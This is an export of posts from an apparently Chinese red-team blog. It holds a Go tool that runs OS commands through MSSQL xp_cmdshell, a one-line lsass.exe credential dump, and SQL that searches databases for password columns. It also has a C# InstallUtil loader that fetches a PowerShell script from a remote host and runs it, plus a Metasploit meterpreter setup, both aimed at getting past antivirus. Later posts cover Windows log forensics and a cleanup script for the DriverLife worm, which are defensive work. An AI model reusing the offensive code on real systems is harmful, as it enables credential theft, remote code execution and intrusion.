<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[mssql linux 命令行工具]]></title>
    <url>%2F2019%2F09%2F19%2Fmssql-command-tool%2F</url>
    <content type="text"><![CDATA[背景: 已知内网某台机器mssql密码，想利用，php连接mssql又缺少库、webshell无root权限、不能出网、无交互、基于web建立socks通道很容易断、python打包文件过大或缺少库…此工具正是解决该问题的 未解决问题： 执行多行sql语句并打印 windows 认证 后面按需要考虑增加 CLR Agent Jobs SandBoxMode sp_OACreate 等方式命令执行 Download 编译:12docker run --rm -it -v $&#123;PWD&#125;:/go golang:stretch env GO111MODULE=on GOPROXY=https://goproxy.io GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags -s -a -installsuffix cgo sqltool.goupx -9 sqltool 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262package mainimport ( "os" "fmt" "log" //"reflect" "github.com/urfave/cli" "database/sql" _ "github.com/denisenkom/go-mssqldb")var ( server string = "127.0.0.1" user = "sa" password string query string cmd string debug bool enable bool connString string conn *sql.DB err error)func main() &#123; app := cli.NewApp() app.Name = "Mssql Toolkit" app.Version = "1.0" app.Usage = "mssql command tool" app.Authors = []cli.Author&#123; cli.Author&#123; Name: "lostwolf", Email: "linuxseclab@gmail.com", &#125;, &#125; app.Flags = []cli.Flag &#123; cli.StringFlag &#123; Name: "server,host,s", Value: "127.0.0.1", Usage: "The database server", &#125;, cli.StringFlag &#123; Name: "user, u", Value: "sa", Usage: "The database user", &#125;, cli.StringFlag &#123; Name: "password, p", Usage: "The database password", &#125;, cli.StringFlag &#123; Name: "query, sql,q", Value: "select @@version", Usage: "SQL query", &#125;, cli.StringFlag &#123; Name: "exec,c,cmd", Value: "whoami", Usage: "Exec System Command", &#125;, cli.BoolFlag&#123; Name: "debug,d", Usage: "Debug info", &#125;, cli.BoolFlag&#123; Name: "enable,e", Usage: "Enabled xp_cmdshell", &#125;, &#125; app.Action = func(c *cli.Context) error &#123; if c.IsSet("server")&#123; server=c.String("server") &#125; if c.IsSet("user")&#123; user=c.String("user") &#125; if c.IsSet("password")&#123; password=c.String("password") &#125; if c.IsSet("query")&#123; query=c.String("query") &#125; if c.IsSet("cmd")&#123; cmd=c.String("cmd") &#125; connString = fmt.Sprintf("server=%s;user id=%s;password=%s;port=1433;encrypt=disable", server, user, password) conn,err = sql.Open("mssql", connString) defer conn.Close() //fmt.Println(reflect.TypeOf(conn)) //fmt.Println(conn) if err != nil &#123; log.Fatal("Open connection failed:", err.Error()) &#125; //fmt.Println(" Connect:",connString) defer conn.Close() if c.IsSet("debug")&#123; if c.Bool("debug")&#123; log.Println("Debug info:") fmt.Printf(" server:%s\n", server) fmt.Printf(" user:%s\n", user) fmt.Printf(" password:%s\n", password) fmt.Printf(" Query:%s\n", query) fmt.Printf(" Cmd:%s\n", cmd) fmt.Println(" Connect:",connString) &#125; &#125; if c.IsSet("enable")&#123; if c.Bool("enable")&#123; Open() &#125; &#125; if c.IsSet("query")&#123; exec_sql() &#125; if c.IsSet("cmd")&#123; os_shell() &#125; return nil &#125; if len(os.Args) &lt;=1 &#123; fmt.Printf("Try '%s --help' for more options.\n",os.Args[0]) &#125; err :=app.Run(os.Args) if err !=nil &#123; log.Fatal(err) &#125; &#125; func exec_sql()&#123; rows, err := conn.Query(query) if err != nil &#123; panic(err.Error()) &#125; defer rows.Close() columns, err := rows.Columns() if err !=nil&#123; panic(err.Error()) &#125; values := make([]sql.RawBytes, len(columns)) scanArgs := make([]interface&#123;&#125;, len(values)) for i := range values &#123; scanArgs[i] = &amp;values[i] &#125; for rows.Next()&#123; err=rows.Scan(scanArgs...) if err !=nil&#123; panic(err.Error()) &#125; var value string for _,col := range values&#123; if col ==nil&#123; value="" &#125;else&#123; value=string(col) &#125; fmt.Println(value) &#125; //fmt.Println("-----------------------------------") &#125; if err = rows.Err(); err != nil &#123; panic(err.Error()) // proper error handling instead of panic in your app &#125;&#125; func Open() &#123; value, err :=conn.Prepare("select value_in_use from sys.configurations where name = 'xp_cmdshell'") if err != nil &#123; log.Fatal("Prepare failed:", err.Error()) &#125; defer value.Close() row := value.QueryRow() //var somenumber int64 var v int err = row.Scan( &amp;v) if err != nil &#123; log.Fatal("Query failed:", err.Error()) &#125; if v==1 &#123; fmt.Printf("xp_cmdshell Enabled\n") &#125;else&#123; fmt.Printf("Open xp_cmdshell...\n") stmt, err := conn.Prepare("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;") if err != nil &#123; //fmt.Println("Query Error", err) return &#125; defer stmt.Close() stmt.Query() &#125; return &#125;func os_shell()&#123; rows, err := conn.Query(`exec master..xp_cmdshell '` + cmd + `' `) if err != nil &#123; panic(err.Error()) &#125; defer rows.Close() columns, err := rows.Columns() if err !=nil&#123; panic(err.Error()) &#125; values := make([]sql.RawBytes, len(columns)) scanArgs := make([]interface&#123;&#125;, len(values)) for i := range values &#123; scanArgs[i] = &amp;values[i] &#125; for rows.Next()&#123; err=rows.Scan(scanArgs...) if err !=nil&#123; panic(err.Error()) &#125; var value string for _,col := range values&#123; if col ==nil&#123; value="" &#125;else&#123; value=string(col) &#125; fmt.Println(value) &#125; &#125; if err = rows.Err(); err != nil &#123; panic(err.Error()) // proper error handling instead of panic in your app &#125;&#125;]]></content>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一条命令dump lsass.exe 进程内存]]></title>
    <url>%2F2019%2F08%2F30%2Fdump-lsass-exe%2F</url>
    <content type="text"><![CDATA[特点: 加载comsvcs.dll系统库，全自动化，不除非杀软 注意: 请用管理员权限执行 1set dumpfile=%tmp%\%COMPUTERNAME%_lass.dump&amp; for /f "tokens=2" %i in ('tasklist /FI "IMAGENAME eq lsass.exe" /NH') do @rundll32 C:\windows\system32\comsvcs.dll, MiniDump %i %dumpfile% full&amp;PING -n 3 127.0.0.1 &gt;NUL 2&gt;&amp;1 || PING -n 3 ::1 &gt;NUL 2&gt;&amp;1 &amp;IF EXIST %dumpfile% (echo processname:lsass.exe Memory saved to %dumpfile%) else (echo Dump wrong.) 参考:MiniDumpWriteDump via COM+ Services DLL]]></content>
      <tags>
        <tag>redteam</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mssql 找指定库指定表]]></title>
    <url>%2F2019%2F08%2F29%2Fmssql-Tips%2F</url>
    <content type="text"><![CDATA[找出包含关键字段的库和表1234567891011121314151617181920212223declare @i int,@id int,@dbname varchar(255),@sql varchar(255) set @i = 6 set @id=(select count(*) from master..sysdatabases)create table #t ( dbname varchar(255), tablename varchar(255), columnname varchar(255))while (@i &lt; @id) begin set @i = @i + 1; set @dbname = (select name from master..sysdatabases where dbid= @i) set @sql = 'use '+ @dbname+';insert [#t] select table_catalog,table_name,column_name from information_schema.columns where column_name like ''%pass%'' or column_name like ''%pwd%'' or column_name like ''%mail%''' exec (@sql) print @sql endselect * from #tdrop table #tgo 所有库中找某个表123456789101112131415161718DECLARE @SQL NVARCHAR(max) SET @SQL = stuff(( SELECT 'UNIONSELECT ' + quotename(NAME, '''') + ' as Db_Name, Name collate SQL_Latin1_General_CP1_CI_AS as Table_NameFROM ' + quotename(NAME) + '.sys.tables WHERE NAME LIKE ''%'' + @TableName + ''%''' FROM sys.databases ORDER BY NAME FOR XML PATH('') ,type ).value('.', 'nvarchar(max)'), 1, 8, '') --PRINT @SQL; EXECUTE sp_executeSQL @SQL ,N'@TableName varchar(30)' ,@TableName = 'admin']]></content>
      <tags>
        <tag>RedTeam</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[c# 远程执行命令]]></title>
    <url>%2F2019%2F08%2F27%2Fremote-exec-powershell%2F</url>
    <content type="text"><![CDATA[一般直接执行powershell会被大多数杀毒软件拦截，利用c# Pipeline 执行远程powershell来绕过杀毒软件 参考来源:tsscyber 12345678use multi/script/web_deliveryset payload windows/x64/meterpreter/reverse_httpset target 2...run -j...c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:c:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:ps.exeC:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=True /u .\ps.exe 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960using System;using System.Net;using System.IO;using System.Configuration.Install;using System.Runtime.InteropServices;using System.Management.Automation.Runspaces;public class Program &#123; public static void Main() &#123; //Console.WriteLine("test"); &#125; &#125; [System.ComponentModel.RunInstaller(true)] public class Sample : System.Configuration.Install.Installer &#123; public override void Uninstall(System.Collections.IDictionary savedState) &#123; Mycode.Exec(); &#125; &#125; public class Mycode &#123; public static void Exec() &#123;WebClient client = new WebClient();//远程执行命令Stream stream = client.OpenRead("http://11.11.11.11/powershell.txt");StreamReader reader = new StreamReader(stream);String command = reader.ReadToEnd();//Console.WriteLine(text); //string command = System.IO.File.ReadAllText(text); RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create(); Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg); rspace.Open(); Pipeline pipeline = rspace.CreatePipeline(); pipeline.Commands.AddScript(command); pipeline.InvokeAsync(); while(pipeline.PipelineStateInfo.State == PipelineState.Running || pipeline.PipelineStateInfo.State == PipelineState.Stopping) &#123; System.Threading.Thread.Sleep(50); &#125; Console.WriteLine("startasdfasdfasdf"); foreach (object item in pipeline.Output.ReadToEnd()) &#123; if(item != null) &#123; Console.WriteLine(item.ToString()); &#125; &#125; foreach (object item in pipeline.Error.ReadToEnd()) &#123; if(item != null) &#123; Console.WriteLine(item.ToString()); &#125; &#125; &#125; &#125;]]></content>
      <tags>
        <tag>redteam 红队</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fiddler script功能实战]]></title>
    <url>%2F2019%2F05%2F25%2Ffiddler-app%2F</url>
    <content type="text"><![CDATA[某视频app发现有观影次数限制很是不爽；想通过分析数据包来看看能不能绕过限制 使用fiddler包分析发现返回请求数据包都加密了 0x01 加密方式 对每个字符进行异或混淆 1234567public static String decodeResponse(String str) &#123; char[] toCharArray = str.toCharArray(); for (int i = 0; i &lt; toCharArray.length; i++) &#123; toCharArray[i] = (char) (toCharArray[i] ^ 20190101); &#125; return String.valueOf(toCharArray); &#125; 0x02 使用Chrome console调试解密方式 1234567var testStr="";var toCharArray=testStr.split('')en='';for (i = 0; i &lt; toCharArray.length; i++)&#123;en += String.fromCharCode(toCharArray[i].charCodeAt(0).toString(10) ^ 20190101)&#125; 0x03 使用fiddler script进行自动解密 fiddler 使用的是jscript.net 语言作为脚本，使用fiddler脚本实现了自动解加密包以便后面分析 解密后的效果 12345678910111213141516static function OnBeforeResponse(oSession: Session) &#123; if (oSession.HostnameIs("api88.awk2.work") ||oSession.HostnameIs("api99.chinanb.work") ) &#123; oSession["ui-color"] = "white"; oSession["ui-backcolor"] = "green"; oSession.utilDecodeResponse(); var oBody = System.Text.Encoding.UTF8.GetString(oSession.responseBodyBytes); var en=''; for (var i:int = 0;i&lt;=oBody.length;i++)&#123; en+=String.fromCharCode(oBody.charCodeAt(i) ^ 20190101); &#125; oSession.utilSetResponseBody(en); &#125;&#125; 0x04 解除观看限制 以下返回数据包记录以及控制观影次数 1&#123;"code":0,"data":[&#123;"readLevel":0,"preferenceCustom":"","gender":-1,"supUserId":5483824,"todayDownNum":0,"companion":"","userBrowCnt":39,"tagIds":"","icon":"","title":"","dailyViewNum":10,"myInviteCode":"XUPBUL","userCode":null,"tagNames":"","inviteCnt":0,"nextLevelNeed":1,"leftViewNum":9,"vipExpiredDate":"","aliasName":null,"userCls":2,"level":0,"limitDownNum":0,"exceedPercent":0,"birth":"","gmtCreate":"2019-01-01 23:04:27.000","userId":9216760,"isMaxLevel":0,"oldDriver":0,"phone":"15****35","name":null,"job":""&#125;],"enumCode":"SUCCESS","msg":"1","success":true&#125; 使用fiddler脚本功能捕获关键字插入正常观影次数的数据包 手机端发现观看次数变成9次了:) 实际上只是表面显示上是突破了，服务端有作统计校验，本次破解以失败告终。]]></content>
      <tags>
        <tag>app测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows 日志分析]]></title>
    <url>%2F2019%2F04%2F07%2FEventLog%2F</url>
    <content type="text"><![CDATA[前置知识常用事件 ID 含义 Event ID(2000/XP/2003) Event ID(Vista/7/8/2008/2012) 描述 日志名称 528 4624 成功登录 Security 529 4625 失败登录 Security 680 4776 成功/失败的账户认证 Security 624 4720 创建用户 Security 636 4732 添加用户到启用安全性的本地组中 Security 632 4728 添加用户到启用安全性的全局组中 Security 2934 7030 服务创建错误 System 2944 7040 IPSEC服务服务的启动类型已从禁用更改为自动启动 System 2949 7045 服务创建 System 556 4662 DC hash传递攻击 Security 登陆类型 登录类型 登录类型 描述 2 Interactive 用户登录到本机 3 Network 用户或计算手机从网络登录到本机，如果网络共享，或使用 net use 访问网络共享，net view 查看网络共享 4 Batch 批处理登录类型，无需用户干预 5 Service 服务控制管理器登录 7 Unlock 用户解锁主机 8 NetworkCleartext 用户从网络登录到此计算机，用户密码用非哈希的形式传递 9 NewCredentials 进程或线程克隆了其当前令牌，但为出站连接指定了新凭据 10 Remotelnteractive 使用终端服务或远程桌面连接登录 11 Cachedlnteractive 用户使用本地存储在计算机上的凭据登录到计算机（域控制器可能无法验证凭据），如主机不能连接域控，以前使用域账户登录过这台主机，再登录就会产生这样日志 12 CachedRemotelnteractive 与 Remotelnteractive 相同，内部用于审计目的 13 CachedUnlock 登录尝试解锁 Log Parser 常用命令失败记录(爆破行为) 直接查看 LogParser.exe -stats:OFF -i:EVT &quot;SELECT top 1000 TimeGenerated AS Date, EXTRACT_TOKEN(strings,10,&#39;|&#39;) as Logtype,EXTRACT_TOKEN(strings,19,&#39;|&#39;) as SourceIP,EXTRACT_TOKEN(strings,13,&#39;|&#39;) as ComputerName,EXTRACT_TOKEN(strings,5,&#39;|&#39;) as User from &#39;Security.evtx&#39; where EventID=4625&quot; -o:DATAGRID 导出csv 方便后期excel 分析 LogParser.exe -stats:OFF -i:EVT &quot;SELECT TimeGenerated AS Date, EXTRACT_TOKEN(strings,10,&#39;|&#39;) as Logtype,EXTRACT_TOKEN(strings,19,&#39;|&#39;) as SourceIP,EXTRACT_TOKEN(strings,5,&#39;|&#39;) as User into tmp_result.csv from &#39;Security.evtx&#39; where EventID=4625&quot; -o:csv 成功登陆(4624) not like &#39;%$&#39; 一般用于查询非机器登陆域控账号 LogParser.exe -stats:OFF -i:EVT &quot;SELECT top 1000 TimeGenerated AS Date,EXTRACT_TOKEN(strings,8,&#39;|&#39;) as Logtype,EXTRACT_TOKEN(strings,18,&#39;|&#39;) as SourceIP,EXTRACT_TOKEN(strings,5,&#39;|&#39;) as User from &#39;Security.evtx&#39; where EventID=4624 And User not like &#39;%$&#39;&quot; -o:DATAGRID hash传递(4662)LogParser.exe -i:EVT &quot;select distinct TimeGenerated,EXTRACT_TOKEN(Strings,2,&#39;|&#39;) AS Domain,EXTRACT_TOKEN(Strings,1,&#39;|&#39;) AS UserName,ComputerName from Security where EventID=4662 order by TimeGenerated desc&quot; -o:DATAGRID 使用powershell 将外部日志导成csvevtx 导出csv 主要目的方便后面excel 分析、筛选。前面用多种方法导出csv发现速度慢得要命，LogParser.exe命令又太长， 后面版本将参数化、并加入多种日志一键导出 使用Get-WinEvent 方法导出日志特点是非常非常非常慢，对于日志量小还可以接受。优点是完全使用powershell不依赖第三方，且可以导入外部日志 Get-EventLog 就要快很多，但是不支持导入外部日志，单纯分析当前机器日志可以使用Get-EventLog来实现 1234567891011121314151617181920212223242526272829303132333435363738$hostname=(hostname)$LogonType = @&#123; [uint32]2 = 'Interactive' [uint32]3 = 'ipc 登陆' [uint32]4 = 'Batch' [uint32]5 = 'Service' [uint32]7 = 'Unlock' [uint32]8 = 'NetworkCleartext' [uint32]9 = 'NewCredentials' [uint32]10 = '远程桌面登陆' [uint32]11 = 'CachedInteractive'&#125;$events_fail =Get-WinEvent -FilterHashTable @&#123; ID=4625;ProviderName='Microsoft-Windows-Security-Auditing';LogName="Security";Path="日志路径\_Security.evtx";&#125;$events_success =Get-WinEvent -FilterHashTable @&#123; ID=4624;ProviderName='Microsoft-Windows-Security-Auditing';LogName="Security";Path="日志路径\_Security.evtx";&#125;$events_fail|ForEach-Object &#123; New-Object PSObject -Property ([ordered]@&#123; MachineName = ($_.MachineName).Split('.')[0] TimeCreated = $_.TimeCreated User = $_.Properties[5].Value Domain = $_.Properties[6].Value LogonType = $_.Properties[10].Value LogonTypeString = $LogonType[$_.Properties[10].Value] SourceIP = $_.Properties[19].Value Keywords = $_.KeywordsDisplayNames -join ";" &#125;)&#125;|Export-Csv -Path $hostname"_fail_login.csv" -NoTypeInformation -UseCulture -Encoding Default$events_success |ForEach-Object &#123; New-Object PSObject -Property ([ordered]@&#123; MachineName = ($_.MachineName).Split('.')[0] TimeCreated = $_.TimeCreated User = $_.Properties[5].Value Domain = $_.Properties[6].Value LogonType = $_.Properties[8].Value LogonTypeString = $LogonType[$_.Properties[8].Value] SourceIP = $_.Properties[18].Value Keywords = $_.KeywordsDisplayNames -join ";" &#125;)&#125; | Export-Csv -Path $hostname"_success_login.csv" -NoTypeInformation -UseCulture -Encoding Default 效果如下： 使用WEVTUtil+powershell 将外部日志导出csv（最终版） 此种方法优点就是快，支持导入外部evtx，对于几百兆巨大日志丝毫不费力 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051Param ( [string]$evtx = $pwd.Path+"\*_Security.evtx")$time=Get-Date -Format h:mm:ss$evtx=(Get-Item $evtx).fullname$outfile=(Get-Item $evtx).BaseName+".csv"$logsize=[int]((Get-Item $evtx).length/1MB)write-host [+] $time Load $evtx "("Size: $logsize MB")" ... -ForegroundColor Green[xml]$xmldoc=WEVTUtil qe $evtx /q:"*[System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and (EventID=4624 or EventID=4625)] and EventData[Data[@Name='LogonType']='3'] or EventData[Data[@Name='LogonType']='10']]" /e:root /f:Xml /lf$xmlEvent=$xmldoc.root.Eventfunction OneEventToDict &#123; Param ( $event ) $ret = @&#123; "SystemTime" = $event.System.TimeCreated.SystemTime | Convert-DateTimeFormat -OutputFormat 'yyyy"/"MM"/"dd HH:mm:ss'; "EventID" = $event.System.EventID &#125; $data=$event.EventData.Data for ($i=0; $i -lt $data.Count; $i++)&#123; $ret.Add($data[$i].name, $data[$i].'#text') &#125; return $ret&#125;filter Convert-DateTimeFormat&#123; Param($OutputFormat='yyyy-MM-dd HH:mm:ss fff') try &#123; ([DateTime]$_).ToString($OutputFormat) &#125; catch &#123;&#125;&#125;$time=Get-Date -Format h:mm:sswrite-host [+] $time Extract XML ... -ForegroundColor Green[System.Collections.ArrayList]$results = New-Object System.Collections.ArrayList($null)for ($i=0; $i -lt $xmlEvent.Count; $i++)&#123; $event = $xmlEvent[$i] $datas = OneEventToDict $event $results.Add((New-Object PSObject -Property $datas))|out-null&#125;$time=Get-Date -Format h:mm:sswrite-host [+] $time Dump into CSV: $outfile ... -ForegroundColor Green$results | Select-Object SystemTime,IpAddress,TargetDomainName,TargetUserName,EventID,LogonType | Export-Csv $outfile -NoTypeInformation -UseCulture -Encoding Default -Force 最终根据excel处理效果如下： 附录windows日志分析恶意日志分析windows日志logparser tips]]></content>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[驱动人生供应链攻击挖矿专杀工具 Demo版]]></title>
    <url>%2F2019%2F03%2F15%2FDriverLife-Worm-killer%2F</url>
    <content type="text"><![CDATA[病毒描述： 360安全大脑监测到通过”驱动人生”供应链攻击传播的挖矿木马在1月30日下午4时左右再次更新。此次更新中，木马在此前抓取系统帐户密码的基础上增加了抓取密码hash值的功能，并试图通过pass the hash攻击进行横向渗透，使得该木马的传播能力进一步加强，即使是有高强度口令的机器也有可能被攻陷。pass the hash也称作哈希传递攻击，攻击者可以直接通过密码的哈希值访问远程主机或服务，而不用提供明文密码。攻击者使用pass the hash技术尝试在系统登录密码非弱口令并且无法抓取登录密码的情况下进行横向攻击，增加攻击成功率。永恒之蓝下载器木马再次更新，此前攻击者针对驱动人生公司的供应链进行攻击，利用其软件升级通道下发永恒之蓝下载器木马，并利用其软件升级通道下发木马，在攻击模块中利用“永恒之蓝”漏洞攻击，造成短时间内大范围感染。事件发生之后，驱动人生公司对受到木马影响的升级通道进行了紧急关闭。 但该木马下载器的幕后控制者并没有就此放弃行动，而是借助其已经感染的机器进行持续攻击：包括通过云控指令下发挖矿模块，在中招机器安装多个服务以及通过添加计划任务获得持续执行的机会，后续版本在攻击模块新增SMB爆破、远程执行工具psexec攻击、利用Powershell版mimikatz获取密码，以增强其扩散传播能力。2019年2月10日发现的更新版本中，我们发现攻击者再次对攻击模块进行升级，改变其木马生成方式为Pyinstaller，同时在打包的Python代码中新增了email、cookie、ftp、http相关功能文件。木马通过将程序安装至系统服务、计划任务从而可以开机启动同时每隔一段时间重复启动，获得在感染电脑持续驻留的机会。 控制维持方式： 查杀脚本功能 删除恶意进程、服务、计划任务、注册表项、恶意文件 删除无规则随机字符串服务 支持最老版本样本，及最新样本 由于该攻击样本不停变形增肥md5值一直在便，故采用md5黑名单+恶意证书方式来清理 由于该系列病毒不断变种，本脚本不保证有效清除，仅作为技术交流使用 恶意证书:驱动人生病毒所涉及的签名证书： 12345CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CNCN=&quot;Shenzhen Qitu Software Technolgy Co., Ltd.&quot;, OU=Digital ID Class 3 - Microsoft Software Validation v2, O=&quot;Shenzhen Qitu Software Technolgy Co., Ltd.&quot;, L=Shenzhen, S=Guangdong, C=CNCN=Shenzhen Le Zhuo Software Technologies Ltd., OU=Digital ID Class 3 - Microsoft Software Validation v2, O=Shenzhen Le Zhuo Software Technologies Ltd., L=Shenzhen, S=Guangdong, C=CN 根据证书判断恶意进程服务案例：http://wolvez.club/2019/02/12/threathunter-windows/ 域名ioc 防火墙配置阻止以下域名访问 12345678http://r.minicen.ga/rhttp://v.beahh.com/vhttp://139.162.107.97/new.dathttp://p.beahh.com/upgrade.phphttp://cert.beahh.comi.haqo.netdl.haqo.netabbny.com 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197Write-Host '# cowsay++' Write-Host ' _________________'Write-Host '&lt; DriverLife Worm killer v0.2&gt;' Write-Host ' -----------------------'Write-Host ' \ ,__,' -ForegroundColor RedWrite-Host ' \ (oo)____' -ForegroundColor RedWrite-Host ' (__) )\' -ForegroundColor RedWrite-Host ' ||--|| *' -ForegroundColor RedWrite-Host write-host 奇安信安服应急小组出品If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) &#123; Write-Host "[x] This script needs to be run As Admin" -ForegroundColor Red Break &#125; Write-Host $evilHashes=@()$evilHashes = "6983F7001DE10F4D19FC2D794C3EB534","8B73928229C19A8F535DE8F2EB2ADC70","59B18D6146A2AA066F661599C496090D","DEF0E980D7C2A59B52D0C644A6E40763","23196DE0EDE25FB9659713FA6799F455","CE924B12FFC55021F5C1BCF308F29704","2FBCE2ECF670EB186C6E3E5886056312","30429A24F312153C0EC271CA3FEABF3D","F9144118127FF29D4A49A30B242CEB55","FB89D40E24F5FF55228C38B2B07B2E77","1E0DB9FDBC57525A2A5F5B4C69FAC3BB","5AB6F8CA1F22D88B8EF9A4E39FCA0C03","D4E2EBCF92CF1B2E759FF7CE1F5688CA","32653B2C277F18779C568A1E45CACC0F","AB1C947C0C707C0E0486D25D0AE58148","A4B7940B3D6B03269194F728610784D6","85013CC5D7A6DB3BCEE3F6B787BAF957","667A3848B411AF0B6C944D47B559150F","8B1AC2F487E9B0A56FBE0A07F0E1F6F4","CCE36235A525858EB55070847296C4C8","9911858E9BEC100CCF6D8134915103EC","74E2A43B2B7C6E258B3A3FC2516C1235","637BF46077AD083659D3B96A010F38FE"$checkPath = @("$env:SystemRoot\", "$env:LOCALAPPDATA\", "$env:ALLUSERSPROFILE\")function _calc_md5&#123; Param($path) if($path -ne $null)&#123; if(Test-Path $path -PathType Leaf )&#123; try&#123; $fs=(new-object system.io.fileinfo($path)).openread(); $r=(new-object system.security.cryptography.md5cryptoserviceprovider).computehash($fs);$fs.close(); [string]$hash=[bitconverter]::tostring($r).replace('-','') &#125;catch&#123;&#125; $retVal = New-Object -TypeName psobject -Property @&#123; Path = $path Hash = $hash &#125; return $retVal &#125; &#125; else&#123; write-host [-] '_calc_md5' $path -ForegroundColor Yellow &#125;&#125;function _del_if_match &#123; Param ( $path ) $md5info = _calc_md5 $path if ($null -ne $md5info) &#123; if ($evilHashes -eq $md5info.Hash) &#123; write-host [-] 'deleting' $path -ForegroundColor Red Remove-Item -Path $path -Force &#125; &#125;&#125;function Check-And-Delete &#123; Param( $path, [switch]$recurse ) $params = @&#123; Filter = '*.exe' Force = $true ErrorAction = 0 Path = $path &#125; if($recurse -ne $False) &#123; $params.Add('recurse', $True) &#125; write-host [i] 'Check-And-Delete' $path -ForegroundColor Green Get-ChildItem @params | %&#123;_del_if_match $_.FullName&#125;&#125;# delete by hashesforeach($path in $checkPath) &#123; Check-And-Delete $path -recurse&#125;Check-And-Delete "$env:HOMEDRIVE\" # delete by sizeforeach ($path in @("$env:APPDATA\Microsoft\cred.ps1", "$env:ALLUSERSPROFILE\Microsoft\cred.ps1")) &#123; $size = (Get-Item $path -ErrorAction SilentlyContinue).Length if ($size -eq 50731) &#123; write-host [-] 'deleting' $path -ForegroundColor Red Remove-Item $path -Force &#125;&#125;write-host [i] 'Check-And-Delete' services -ForegroundColor Green$servicesPath = @&#123;&#125;foreach ($service in (Get-WmiObject win32_service)) &#123; [String]$name = $service.pathname $exePath = $name.Split()[0] if($name.StartsWith('"')) &#123; $exePath = $name.Split('"')[1] &#125; # if powershell if($name.ToLower().IndexOf("powershell.exe ") -gt 0 -and $name.ToLower().IndexOf(" -enc") -gt 0) &#123; write-host [-] 'deleting service' $path -ForegroundColor Red Stop-Service -Force -Name $service.Name -ErrorAction SilentlyContinue sc.exe delete $service.Name &#125; if($name.ToLower().IndexOf("powershell") -gt 0 -and $name.ToLower().IndexOf("bypass") -gt 0) &#123; write-host [-] 'deleting service' $path -ForegroundColor Red Stop-Service -Force -Name $service.Name -ErrorAction SilentlyContinue sc.exe delete $service.Name &#125; if($servicesPath.ContainsKey($exePath)) &#123; continue &#125; $servicesPath.Add($exePath, 1) $servicemd5 = _calc_md5 $exePath if ($null -ne $servicemd5) &#123; if ($evilHashes -eq $servicemd5.Hash) &#123; write-host [-] 'deleting Service:' $service.Name 'Path:' $exePath -ForegroundColor Red Remove-Item -Path $exePath -Force sc.exe delete $service.Name &#125; &#125; ##_del_if_match $exePath&#125;##删除服务cmd.exe /c "sc.exe delete WebServers 2&gt;nul&gt;nul"cmd.exe /c "sc.exe delete Ddriver 2&gt;nul&gt;nul"cmd.exe /c "sc.exe delete DnsScan 2&gt;nul&gt;nul"##delete startupwrite-host [i] delete startup -ForegroundColor GreenGet-ChildItem -Path 'C:\Users\*\AppData\Roaming\Microsoft\Windows\*' -force -Recurse -ErrorAction 0 | ?&#123;$_.name -eq "run.bat"&#125; |Remove-Item##删除注册表值write-host [i] delete Registry -ForegroundColor GreenRemove-ItemProperty "HKlM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -name "WebServers" -Force -ErrorAction 0Remove-ItemProperty "HKlM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -name "Ddriver" -Force -ErrorAction 0##删除计划任务write-host [i] delete tasks -ForegroundColor Greencmd.exe /c "schtasks /delete /tn '\Microsoft\windows\Bluetooths' /f 2&gt;nul"cmd.exe /c "schtasks /delete /tn '\dnsscan' /f 2&gt;nul&gt;nul"cmd.exe /c "schtasks /delete /tn '\Certificate' /f 2&gt;nul&gt;nul"cmd.exe /c "schtasks /delete /tn '\dnsscan' /f 2&gt;nul&gt;nul"cmd.exe /c "schtasks /delete /tn '\Ddrivers' /f 2&gt;nul&gt;nul"cmd.exe /c "schtasks /delete /tn '\WebServers' /f 2&gt;nul"write-host [i] delete process -ForegroundColor Greencmd.exe /c "taskkill -im wmiex.exe /f 2&gt;nul"wmic process where "name='svchost.exe' and ExecutablePath='C:\\windows\\system32\\drivers\\svchost.exe'" call Terminate |Out-Nullwmic process where "name='taskmgr.exe' and ExecutablePath='C:\\windows\\system32\\drivers\\taskmgr.exe'" call Terminate |Out-Nullwmic process where "name='svchost.exe' and ExecutablePath='C:\\windows\\SysWOW64\\drivers\\svchost.exe'" call Terminate |Out-Nullwmic process where "name='taskmgr.exe' and ExecutablePath='C:\\windows\\SysWOW64\\drivers\\taskmgr.exe'" call Terminate |Out-Nullwmic process where "name='updater.exe' and ExecutablePath='C:\\Windows\\temp\\updater.exe'" call 